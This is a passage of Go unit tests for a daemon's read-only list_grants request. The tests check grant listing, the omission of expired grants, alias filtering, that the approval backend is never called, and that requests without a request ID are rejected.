	gr := createGrant(t, d, "g_req", "prod", "commands", []string{"systemctl restart nginx"}, 3600)
	if gr.Status != "approved" {
		t.Fatalf("grant status = %q; want approved (err=%q)", gr.Status, gr.Error)
	}

	lr := listGrants(t, d, "l_req", "")
	if lr.Status != "ok" {
		t.Fatalf("list status = %q; want ok (err=%q)", lr.Status, lr.Error)
	}
	if lr.ProtoVersion != sigwire.ProtoVersion {
		t.Errorf("proto_version = %d; want %d", lr.ProtoVersion, sigwire.ProtoVersion)
	}
	if lr.RequestID != "l_req" {
		t.Errorf("request_id = %q; want l_req", lr.RequestID)
	}
	if len(lr.Grants) != 1 {
		t.Fatalf("got %d grants; want 1", len(lr.Grants))
	}
	g := lr.Grants[0]
	if g.GrantID != gr.GrantID {
		t.Errorf("grant_id = %q; want %q (the id request_grant returned)", g.GrantID, gr.GrantID)
	}
	if g.Alias != "prod" {
		t.Errorf("alias = %q; want prod", g.Alias)
	}
	if g.Scope != "commands" {
		t.Errorf("scope = %q; want commands", g.Scope)
	}
	if len(g.Commands) != 1 || g.Commands[0] != "systemctl restart nginx" {
		t.Errorf("commands = %v; want [systemctl restart nginx]", g.Commands)
	}
	// Expiry is base + 1h.
	if g.ExpiryUnix != base.Add(3600*time.Second).Unix() {
		t.Errorf("expiry_unix = %d; want %d", g.ExpiryUnix, base.Add(3600*time.Second).Unix())
	}
}

// TestListGrants_OmitsExpiredGrant pins that a grant whose window has
// elapsed is NEVER reported — list_grants must never surface a dead /
// phantom-expired grant.
func TestListGrants_OmitsExpiredGrant(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	base := time.Unix(1000, 0)
	d, _, audit, _, clk := newGrantDaemon(t, mock, base)
	defer audit.Close()

	mock.Approve("g_req", "karthi")
	gr := createGrant(t, d, "g_req", "prod", "all", nil, 3600)
	if gr.Status != "approved" {
		t.Fatalf("grant status = %q; want approved", gr.Status)
	}

	// Before expiry: reported.
	if lr := listGrants(t, d, "l_before", ""); len(lr.Grants) != 1 {
		t.Fatalf("pre-expiry: got %d grants; want 1", len(lr.Grants))
	}

	// Advance past expiry (base + 1h + 1s).
	clk.set(base.Add(3601 * time.Second))

	lr := listGrants(t, d, "l_after", "")
	if lr.Status != "ok" {
		t.Fatalf("list status = %q; want ok", lr.Status)
	}
	if len(lr.Grants) != 0 {
		t.Errorf("post-expiry: got %d grants; want 0 (expired grant must not be reported)", len(lr.Grants))
	}
}

// blockingBackend is a Backend whose Request / RequestGrant always error
// (and record that they were touched). list_grants must NEVER consult the
// backend — a read-only verb has no approval path — so this proves the
// handler returns promptly from in-memory state without an approval round.
type blockingBackend struct {
	mu     sync.Mutex
	called bool
}

func (b *blockingBackend) mark() {
	b.mu.Lock()
	b.called = true
	b.mu.Unlock()
}

func (b *blockingBackend) wasCalled() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.called
}

func (b *blockingBackend) Request(context.Context, backend.ApprovalRequest) (<-chan backend.Result, error) {
	b.mark()
	return nil, fmt.Errorf("blockingBackend: Request must not be called by list_grants")
}

func (b *blockingBackend) RequestGrant(context.Context, backend.GrantApprovalRequest) (<-chan backend.Result, error) {
	b.mark()
	return nil, fmt.Errorf("blockingBackend: RequestGrant must not be called by list_grants")
}

// TestListGrants_NoApprovalNoBackend pins that list_grants is purely
// read-only: against a backend whose every method errors, list_grants
// still returns ok promptly and never touches the backend.
func TestListGrants_NoApprovalNoBackend(t *testing.T) {
	t.Parallel()
	bk := &blockingBackend{}
	d, _, audit, _, _ := newGrantDaemon(t, bk, time.Unix(1000, 0))
	defer audit.Close()

	lr := listGrants(t, d, "l_req", "")
	if lr.Status != "ok" {
		t.Fatalf("list status = %q; want ok (err=%q)", lr.Status, lr.Error)
	}
	if len(lr.Grants) != 0 {
		t.Errorf("got %d grants; want 0 (no grant minted)", len(lr.Grants))
	}
	if bk.wasCalled() {
		t.Error("backend was consulted by list_grants; it must be read-only (no approval)")
	}
}

// TestListGrants_AliasFilter pins the optional alias filter: with two
// live grants, listing for one alias returns only that grant.
func TestListGrants_AliasFilter(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	d, _, audit, _, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
	defer audit.Close()

	mock.Approve("g_prod", "karthi")
	if gr := createGrant(t, d, "g_prod", "prod", "all", nil, 3600); gr.Status != "approved" {
		t.Fatalf("prod grant status = %q; want approved", gr.Status)
	}
	mock.Approve("g_src", "karthi")
	if gr := createGrant(t, d, "g_src", "src", "all", nil, 3600); gr.Status != "approved" {
		t.Fatalf("src grant status = %q; want approved", gr.Status)
	}

	// No filter → both.
	if lr := listGrants(t, d, "l_all", ""); len(lr.Grants) != 2 {
		t.Fatalf("unfiltered: got %d grants; want 2", len(lr.Grants))
	}

	// Filter to "prod" → exactly one, the prod grant.
	lr := listGrants(t, d, "l_prod", "prod")
	if lr.Status != "ok" {
		t.Fatalf("list status = %q; want ok", lr.Status)
	}
	if len(lr.Grants) != 1 {
		t.Fatalf("filtered: got %d grants; want 1", len(lr.Grants))
	}
	if lr.Grants[0].Alias != "prod" {
		t.Errorf("filtered alias = %q; want prod", lr.Grants[0].Alias)
	}
}

// TestListGrants_MissingRequestID pins that a list_grants with no
// request_id is rejected as an error (the daemon's every-request-has-an-id
// contract).
func TestListGrants_MissingRequestID(t *testing.T) {
	t.Parallel()
	mock := backend.NewMockBackend()
	d, _, audit, _, _ := newGrantDaemon(t, mock, time.Unix(1000, 0))
	defer audit.Close()

	body := map[string]any{"kind": "list_grants"}
	raw, _ := json.Marshal(body)
	conn := &memConn{in: bytes.NewReader(append(raw, '\n')), out: &bytes.Buffer{}}
	if err := d.HandleSignRequest(context.Background(), conn); err != nil {
		t.Fatalf("HandleSignRequest(list_grants): %v", err)
	}
	var resp listGrantsResp
	if err := json.Unmarshal(bytes.TrimRight(conn.out.Bytes(), "\n"), &resp); err != nil {
		t.Fatalf("decode list resp: %v", err)
	}
	if resp.Status != "error" {
		t.Errorf("status = %q; want error for missing request_id", resp.Status)
	}
}
